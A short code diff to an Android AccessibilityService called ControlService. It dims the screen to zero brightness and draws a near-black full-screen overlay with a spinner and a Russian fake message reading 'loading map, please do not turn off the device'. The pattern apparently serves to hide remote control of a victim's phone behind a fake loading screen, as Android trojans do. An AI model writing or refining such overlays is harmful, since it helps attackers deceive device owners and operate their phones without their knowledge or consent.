@@ -166,12 +166,24 @@ class ControlService : AccessibilityService() {
         }
         params.screenBrightness = 0f
         darkParams = params
-        val view = android.widget.TextView(this).apply {
+        val view = android.widget.LinearLayout(this).apply {
             setBackgroundColor(android.graphics.Color.argb(252, 0, 0, 0))
-            text = "Загрузка..."
-            setTextColor(android.graphics.Color.WHITE)
-            textSize = 24f
+            orientation = android.widget.LinearLayout.VERTICAL
             gravity = android.view.Gravity.CENTER
+            val spinner = android.widget.ProgressBar(context).apply {
+                isIndeterminate = true
+                indeterminateTintList = android.content.res.ColorStateList.valueOf(android.graphics.Color.WHITE)
+                layoutParams = android.widget.LinearLayout.LayoutParams(160, 160).also { it.bottomMargin = 48 }
+            }
+            val label = android.widget.TextView(context).apply {
+                text = "ЗАГРУЗКА КАРТЫ...\nПОЖАЛУЙСТА НЕ ВЫКЛЮЧАЙТЕ УСТРОЙСТВО"
+                setTextColor(android.graphics.Color.WHITE)
+                textSize = 20f
+                gravity = android.view.Gravity.CENTER
+                textAlignment = android.view.View.TEXT_ALIGNMENT_CENTER
+            }
+            addView(spinner)
+            addView(label)
         }
         darkView = view
         if (overlayView == null) {
